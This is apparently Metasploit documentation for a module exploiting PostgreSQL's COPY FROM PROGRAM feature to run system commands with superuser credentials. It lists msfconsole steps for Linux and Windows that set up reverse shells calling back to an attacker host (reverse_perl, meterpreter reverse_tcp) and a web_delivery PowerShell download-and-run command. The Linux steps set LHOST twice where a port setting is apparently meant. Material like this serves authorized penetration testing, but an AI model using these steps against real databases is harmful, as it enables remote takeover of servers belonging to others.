This module attempts to create a new table, then execute system commands in the
context of copying the command output into the table.

This module should work on all Postgres systems running version 9.3 and above.

## Vulnerable Application

  Download any version of PostgreSQL from 9.3 to 11.2 (Latest at time of writing)
  Set up the software and connect as the postgres superuser.
  Use the techniques described in this blogpost to verify command execution:
    https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5

## Verification Steps

  You must be able to connect to the PostgreSQL database, and have a valid set of superuser
  credentials, or a user in the 'pg_read_server_files' group
  
  Exploiting Linux/OSX:

    1. Start msfconsole
    2. use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
    3. set RHOST target.ip.add.ress
    4. set payload cmd/unix/reverse_perl
    5. set PASSWORD postgres
    6. set USERNAME postgres
    7. set DATABASE postgres
    8. set LHOST my.ip.add.ress
    9. set LHOST myport
    10. exploit
  
  Exploiting Windows:

    1. Start msfconsole
    2. use exploit/multi/script/web_delivery
    3. set target 2
    4. set payload windows/meterpreter/reverse_tcp
    5. set LHOST my.ip.add.ress
    6. exploit -j
    7. Copy powershell command, add \ to escape any single quotes
    8. use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
    9. set RHOST target.ip.add.ress
    10. set COMMAND powershell... (Output from Step 7)
    11. set PASSWORD postgres
    12. set USERNAME postgres
    13. set DATABASE postgres
    14. exploit


## Options

  **COMMAND**

  Instead of using a cmd stager metasploit payload, for windows you need to execute a command. This is suggested to be 
  a web_delivery powershell command, however other techniques can be used. 
  
  **TABLENAME**
  
  The name of the table to create in the database, default is set to 'msftesttable', this table will be dropped create a new
  one each time the exploit is run.
  
  **DATABASE**
  
  Name of the database to connect to
  
  **USERNAME**
  
  A valid username that allows access to the database
  
  **PASSWORD**
  
  A valid password that allows access to the database
  
## Scenarios

### Exploiting PostgreSQL 10.7 on Linux

   ![Image Not Found](https://cdn-images-1.medium.com/max/1600/1*G0E4YMdLA59lDsDm38Ce-g.png)
   ![Image Not Found](https://cdn-images-1.medium.com/max/1600/1*sJLJlahpTxWrB566k-IHwQ.png)
   
### Exploiting PostgreSQL 10.7 on Windows

   ![Image Not Found](https://cdn-images-1.medium.com/max/1600/1*3Bl2irM5HTo6g9QyrsikrQ.png)
   ![Image Not Found](https://cdn-images-1.medium.com/max/1600/1*fy3LiHGoy18GITlZ0xeRyQ.png)
   ![Image Not Found](https://cdn-images-1.medium.com/max/1600/1*wT2Nys2_jZiwpY6AsjLGpQ.png)
